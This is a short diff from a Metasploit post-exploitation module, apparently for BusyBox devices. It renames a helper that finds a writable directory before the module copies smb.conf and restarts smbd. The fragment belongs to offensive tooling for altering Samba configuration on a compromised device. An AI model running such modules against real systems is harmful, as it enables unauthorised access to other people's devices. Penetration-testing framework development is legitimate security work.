@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
     print_status('Checking smb.conf...')
     if busy_box_file_exist?('/var/samba/smb.conf')
       print_status('smb.conf found, searching writable directory...')
-      writable_directory = get_writable_directory
+      writable_directory = busy_box_writable_dir
       if writable_directory
         print_status('writable directory found, copying smb.conf and restarting smbd')
         copy_smb_conf(writable_directory)
